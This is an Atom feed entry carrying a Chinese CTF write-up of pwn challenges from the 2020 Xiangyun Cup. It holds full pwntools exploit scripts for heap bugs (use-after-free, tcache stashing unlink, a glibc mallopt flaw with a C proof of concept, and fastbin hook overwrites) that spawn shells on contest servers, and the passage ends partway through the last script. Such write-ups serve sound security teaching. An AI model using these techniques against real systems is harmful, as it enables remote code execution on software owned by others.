<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Chumen77&#39;s Blog</title>
  
  <subtitle>永远相信美好的事情即将发生！</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://chumen77.xyz/"/>
  <updated>2020-11-30T14:37:11.765Z</updated>
  <id>http://chumen77.xyz/</id>
  
  <author>
    <name>chumen77</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>祥云杯2020CTF部分pwn wp</title>
    <link href="http://chumen77.xyz/2020/11/23/%E7%A5%A5%E4%BA%91%E6%9D%AF2020CTF%E9%83%A8%E5%88%86pwn%20wp/"/>
    <id>http://chumen77.xyz/2020/11/23/祥云杯2020CTF部分pwn wp/</id>
    <published>2020-11-22T23:11:41.879Z</published>
    <updated>2020-11-30T14:37:11.765Z</updated>
    
    <content type="html"><![CDATA[<h1 id="祥云杯2020CTF部分pwn-wp"><a href="#祥云杯2020CTF部分pwn-wp" class="headerlink" title="祥云杯2020CTF部分pwn wp"></a>祥云杯2020CTF部分pwn wp</h1><h2 id="￼Beauty-Of-ChangChun"><a href="#￼Beauty-Of-ChangChun" class="headerlink" title="￼Beauty_Of_ChangChun"></a>￼<code>Beauty_Of_ChangChun</code></h2><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><ul><li>del函数中存在uaf的漏洞，且只对byte位的size清0，0x100的chunk不受影响</li><li>存在后门函数</li></ul><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>开始程序就把flag读入了一个特定的内存中，并且后门函数中，只需确定flag字符串前8位字节的具体值即可拿到flag。所以可以用Tcache Stashing Unlink ，往flag 前的8位写上main arean附近的地址。并且可以泄漏libc，算下偏移，所以也就知道了其写上的数值，然后就调用后门函数获得flag。具体思路可以看下方exp。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'112.126.71.170'</span>,<span class="hljs-number">43652</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae16 = <span class="hljs-number">0x3c4b78</span>arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size)</span>:</span>    sla(<span class="hljs-string">"4: Enjoy scenery\n"</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size'</span>,str(size))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">"4: Enjoy scenery\n"</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">"4: Enjoy scenery\n"</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))    sa(<span class="hljs-string">'chat'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">"4: Enjoy scenery\n"</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))ru(<span class="hljs-string">'le\n'</span>)flag = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) info_addr(<span class="hljs-string">'flag'</span>,flag)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">6</span>):    add(<span class="hljs-number">0x80</span>)    free(<span class="hljs-number">0</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):    add(<span class="hljs-number">0xff</span>)    free(<span class="hljs-number">0</span>)add(<span class="hljs-number">0x100</span>)add(<span class="hljs-number">0x80</span>)add(<span class="hljs-number">0x100</span>)free(<span class="hljs-number">1</span>)add(<span class="hljs-number">0x90</span>)free(<span class="hljs-number">0</span>)free(<span class="hljs-number">2</span>)show(<span class="hljs-number">2</span>)ru(<span class="hljs-string">'see\n'</span>)heap = uu64(r(<span class="hljs-number">6</span>))info_addr(<span class="hljs-string">'heap'</span>,heap)show(<span class="hljs-number">0</span>)ru(<span class="hljs-string">'see\n'</span>)fd = uu64(r(<span class="hljs-number">6</span>))libcbase = fd <span class="hljs-number">-0x1ebbe0</span>info_addr(<span class="hljs-string">'fd'</span>,fd)info_addr(<span class="hljs-string">'libcbase'</span>,libcbase)sla(<span class="hljs-string">"4: Enjoy scenery\n"</span>,<span class="hljs-string">'666'</span>)<span class="hljs-comment"># </span>sla(<span class="hljs-string">"4: Enjoy scenery\n"</span>,<span class="hljs-string">'5'</span>)sl(<span class="hljs-string">'aaaaaaa'</span>)edit(<span class="hljs-number">2</span>,p64(heap) + p64(flag<span class="hljs-number">-0x10</span>))free(<span class="hljs-number">1</span>)add(<span class="hljs-number">0x100</span>)edit(<span class="hljs-number">0</span>,p64(libcbase + <span class="hljs-number">0x1ebce0</span>))sla(<span class="hljs-string">"4: Enjoy scenery"</span>,<span class="hljs-string">'5'</span>)sla(<span class="hljs-string">'idx'</span>,<span class="hljs-string">'1'</span>)itr()</code></pre></div><h3 id="flag值"><a href="#flag值" class="headerlink" title="flag值"></a>flag值</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/5JyYs3.png" srcset="/img/loading.gif" alt></p><div class="hljs"><pre><code class="hljs undefined">flag&#123;443f40ee-f4de-<span class="hljs-number">40b3</span>-ab94-b7afa6f9&#125;</code></pre></div><h2 id="把嘴闭上"><a href="#把嘴闭上" class="headerlink" title="把嘴闭上"></a>把嘴闭上</h2><p>分析程序，发现漏洞点肯定在mallopt函数上。但是不怎么熟悉，就开始谷歌这个函数相关的漏洞，审计libc源码。</p><p>最终发现一个漏洞报告。<br><a href="https://www.cygwin.com/bugzilla/show_bug.cgi?id=25733" target="_blank" rel="noopener">https://www.cygwin.com/bugzilla/show_bug.cgi?id=25733</a></p><h3 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>在libc 2.23中，<code>mallopt(M_MXFAST) can set global_max_fast to 0</code><br>就出现了漏洞。</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-comment">// mallopt(M_MXFAST) can set global_max_fast to 0.</span><span class="hljs-comment">// This doesn't seem intentional because mallopt(M_MXFAST, 0) sets global_max_fast to SMALLBIN_WIDTH.</span><span class="hljs-comment">// Passing a value between 1-7 to mallopt(M_MXFAST, value) sets global_max_fast to 0.</span><span class="hljs-comment">// Both malloc.c and the mallopt man page document the legitimate range of values that may be passed to mallopt(M_MXFAST, value) as "0 to 80*sizeof(size_t)/4".</span><span class="hljs-comment">// In GLIBC versions &gt;= 2.27 this has the same effect as setting global_max_fast to SMALLBIN_WIDTH, but it is perhaps of some concern in GLIBC versions &lt;= 2.26 because of how global_max_fast is treated as an indicator of main arena initialization by malloc_consolidate().</span><span class="hljs-comment">// If the following example is compiled &amp; run under GLIBC version 2.26, a chunk is allocated overlapping the main arena:</span><span class="hljs-comment">// 这似乎不是故意的，因为mallopt（M_MXFAST，0）将global_max_fast设置为SMALLBIN_WIDTH。</span><span class="hljs-comment">// 将1-7之间的值传递给mallopt（M_MXFAST，value）会将global_max_fast设置为0。</span><span class="hljs-comment">// malloc.c和mallopt手册页都记录了可以传递给mallopt（M_MXFAST，value）的合法值范围，范围为“ 0到80 * sizeof（size_t）/ 4”。</span><span class="hljs-comment">// 在&gt; = 2.27的GLIBC版本中，其效果与将global_max_fast设置为SMALLBIN_WIDTH相同，</span><span class="hljs-comment">// 但是在&lt;= 2.26的GLIBC版本中，这可能会引起一些关注，</span><span class="hljs-comment">// 但在GLIBC版本&lt;= 2.26中，这可能会引起一些关注，</span><span class="hljs-comment">// 因为malloc merge()将全局max fast视为主竞技场初始化的指示符。</span><span class="hljs-comment">// 如果以下示例是在GLIBC版本2.26下编译并运行的，则分配的块与主区域重叠</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;malloc.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;    <span class="hljs-comment">// Populate last_remainder, which is treated as the top chunk size field</span>    <span class="hljs-comment">// after main arena re-initialization.</span>    <span class="hljs-comment">// 填充last_remainder，将其视为最大块大小字段</span>   <span class="hljs-comment">// 主竞技场重新初始化之后。</span>    <span class="hljs-keyword">void</span>* remainder_me = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x418</span>);    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x18</span>);     <span class="hljs-comment">// Avoid top chunk consolidation.</span>    <span class="hljs-built_in">free</span>(remainder_me);    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x18</span>);     <span class="hljs-comment">// Remainder remainder_me chunk.</span>    <span class="hljs-comment">// Set global_max_fast to 0.</span>    mallopt(M_MXFAST, <span class="hljs-number">7</span>);    <span class="hljs-comment">// Trigger malloc_consolidate(), which could happen during large</span>    <span class="hljs-comment">// allocations/frees, but for the sake of simplicity here just call</span>    <span class="hljs-comment">// mallopt() again.</span>    mallopt(M_MXFAST, <span class="hljs-number">0x78</span>);    <span class="hljs-comment">// malloc_consolidate() uses global_max_fast to determine if malloc has</span>    <span class="hljs-comment">// been initialized. If global_max_fast is 0, malloc_consolidate() will</span>    <span class="hljs-comment">// re-initialize the main arena, setting its top chunk pointer to an address</span>    <span class="hljs-comment">// within the main arena. Now last_remainder acts as the top chunk size</span>    <span class="hljs-comment">// field.</span>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%p\n"</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x418</span>));    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p>发现的确存在这样的漏洞。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/Mr6g3B.png" srcset="/img/loading.gif" alt></p><h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><p>因为其最后申请的堆回跑到libc上，并且发现其在free hook 的上面。<br>那么在尽量不破坏libc 上内存的情况下，一直的申请内存，肯定改到free hook。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-comment"># icqaa6603da5d8063707dd74952c7daf</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./ba_zui_bi_shang'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'112.126.71.170'</span>,<span class="hljs-number">23548</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]one_gadgets = [<span class="hljs-number">0x45226</span>,<span class="hljs-number">0x4527a</span>,<span class="hljs-number">0xf0364</span>,<span class="hljs-number">0xf1207</span>]arae16 = <span class="hljs-number">0x3c4b78</span>arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_name</span><span class="hljs-params">(size,data)</span>:</span>    sla(<span class="hljs-string">'&gt; '</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'&gt; '</span>,str(size))    sla(<span class="hljs-string">'&gt; '</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'&gt; '</span>,<span class="hljs-string">'2'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">mallopt</span><span class="hljs-params">(param_number,value)</span>:</span>    sla(<span class="hljs-string">'&gt; '</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'&gt; '</span>,str(param_number))    sla(<span class="hljs-string">'&gt; '</span>,str(value))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>    sla(<span class="hljs-string">'&gt; '</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'&gt; '</span>,str(size))    sla(<span class="hljs-string">'&gt; '</span>,str(data))ru(<span class="hljs-string">'0x'</span>)libcbase = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - libc.symbols[<span class="hljs-string">'puts'</span>]info_addr(<span class="hljs-string">'libc'</span>,libcbase)<span class="hljs-comment"># debug()</span>ru(<span class="hljs-string">'&gt; '</span>)sl(str(<span class="hljs-number">0x418</span>))ru(<span class="hljs-string">'&gt; '</span>)io.send(<span class="hljs-string">'\n'</span>)add_name(<span class="hljs-number">0x18</span>,<span class="hljs-string">'chumen77\n'</span>)free()add_name(<span class="hljs-number">0x18</span>,<span class="hljs-string">'chumen77\n'</span>)mallopt(<span class="hljs-number">1</span>,<span class="hljs-number">7</span>)<span class="hljs-comment"># debug()</span>mallopt(<span class="hljs-number">1</span>,<span class="hljs-number">0x78</span>)add(<span class="hljs-number">0x418</span>,<span class="hljs-string">'\n'</span>)add(<span class="hljs-number">0x418</span>,<span class="hljs-string">'\n'</span>)add(<span class="hljs-number">0x418</span>,<span class="hljs-string">'\n'</span>)add(<span class="hljs-number">0x418</span>,<span class="hljs-string">'\n'</span>)add(<span class="hljs-number">0x418</span>,<span class="hljs-string">'\n'</span>)add(<span class="hljs-number">0x418</span>,<span class="hljs-string">'\n'</span>)add(<span class="hljs-number">0x418</span>,<span class="hljs-string">'/bin/sh\x00'</span> + <span class="hljs-string">'\x00'</span>*<span class="hljs-number">0x358</span> + p64(libc.symbols[<span class="hljs-string">'system'</span>]+libcbase))<span class="hljs-comment"># debug()</span>free()itr()</code></pre></div><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/bpPUlY.png" srcset="/img/loading.gif" alt></p><div class="hljs"><pre><code class="hljs undefined">flag&#123;<span class="hljs-number">1</span>db37b9de003140420951bf5f77483a7&#125;</code></pre></div><h2 id="影流之主"><a href="#影流之主" class="headerlink" title="影流之主"></a>影流之主</h2><h3 id="漏洞点-2"><a href="#漏洞点-2" class="headerlink" title="漏洞点"></a>漏洞点</h3><ul><li>uaf</li></ul><h3 id="利用思路-2"><a href="#利用思路-2" class="headerlink" title="利用思路"></a>利用思路</h3><div class="hljs"><pre><code class="hljs undefined">f ( !glob(<span class="hljs-name">pattern</span>, <span class="hljs-number">4098</span>, <span class="hljs-number">0</span>LL, <span class="hljs-symbol">&amp;pglob</span>) )globfree(<span class="hljs-name">&amp;pglob</span>)<span class="hljs-comment">;</span></code></pre></div><p>可以用这个函数来创建出一个巨大的unsorted bin,接着申请chunk上去即可泄漏出libc，然后就是fastbin attack，攻击malloc hook,最后需要free 2次同一个chunk，触发异常机制，然后再次调用malloc触发到one gadget </p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./ying_liu_zhi_zhu'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'112.126.71.170'</span>,<span class="hljs-number">45123</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45226</span>,<span class="hljs-number">0x4527a</span>,<span class="hljs-number">0xf0364</span>,<span class="hljs-number">0xf1207</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae16 = <span class="hljs-number">0x3c4b78</span>arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">()</span>:</span>    sl(<span class="hljs-string">'1'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sl(<span class="hljs-string">'2'</span>)    sl(str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sl(<span class="hljs-string">'3'</span>)    sl(str(idx))    s(str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sl(<span class="hljs-string">'4'</span>)    sl(str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">b</span><span class="hljs-params">(data)</span>:</span>    sl(<span class="hljs-string">'5'</span>)    sl(str(data))<span class="hljs-comment"># add()</span>b(<span class="hljs-string">b'*/lib*'</span>)  <span class="hljs-comment">#0x3c4ce8</span><span class="hljs-comment"># b(b'*') #0x3c4b78</span>add() <span class="hljs-comment">#0</span>add()add()add()add() <span class="hljs-comment">#4</span>show(<span class="hljs-number">1</span>)libcbase = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3c4ce8</span>info_addr(<span class="hljs-string">'libc'</span>,libcbase)free(<span class="hljs-number">1</span>)edit(<span class="hljs-number">1</span>,p64(libcbase+<span class="hljs-number">0x3c4aed</span>))add()add()one = <span class="hljs-number">0xf0364</span> + libcbaserealloc = libcbase + libc.symbols[<span class="hljs-string">'realloc'</span>] + realloc[<span class="hljs-number">4</span>]payload = <span class="hljs-string">'\x00'</span> *<span class="hljs-number">3</span> + p64(<span class="hljs-number">0</span>)  + p64(one)+ p64(realloc)edit(<span class="hljs-number">6</span>,payload)free(<span class="hljs-number">0</span>)free(<span class="hljs-number">0</span>)itr()</code></pre></div><h3 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/U7zeII.png" srcset="/img/loading.gif" alt></p><div class="hljs"><pre><code class="hljs undefined">flag&#123;dfbe8fe7-b6f4<span class="hljs-number">-4</span>c3a-a226<span class="hljs-number">-6</span>a8b12fd683f&#125;</code></pre></div><h2 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h2><h3 id="漏洞点-3"><a href="#漏洞点-3" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>c++的程序代码看起来比较的乱，直接上手进行调试。<br>发现在init create init 这样的顺序执行后，程序就变得诡异起来，并没把重要的指针转移到新init来的内存块来使用，而是还是使用原来init开起来虚表指针，由于其大小是0x90的chunk，接着可以实现泄漏。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/FaLGv4.png" srcset="/img/loading.gif" alt><br>如图，控制这两个指针就可以任意地址读和写。然后再次申请0x8f的堆块,set一下即可控制这2个指针。<br><img src="http://qiqianyun.chumen77.xyz/uPic/3gVHpF.png" srcset="/img/loading.gif" alt></p><p>然后改写到free hook，再次create函数其会free 原来的chunk，即可触发one gadget。</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'8.131.69.237'</span>,<span class="hljs-number">52642</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45226</span>,<span class="hljs-number">0x4527a</span>,<span class="hljs-number">0xf0364</span>,<span class="hljs-number">0xf1207</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae16 = <span class="hljs-number">0x3c4b78</span>arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">init</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'ice:'</span>,<span class="hljs-string">'1'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'ice:'</span>,<span class="hljs-string">'2'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size)</span>:</span>    sla(<span class="hljs-string">'ice:'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'size'</span>,str(size))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">set</span><span class="hljs-params">(data)</span>:</span>    sla(<span class="hljs-string">'ice:'</span>,<span class="hljs-string">'4'</span>)    sa(<span class="hljs-string">'tent'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'ice:'</span>,<span class="hljs-string">'5'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">size</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'ice:'</span>,<span class="hljs-string">'6'</span>)init()create()<span class="hljs-comment"># 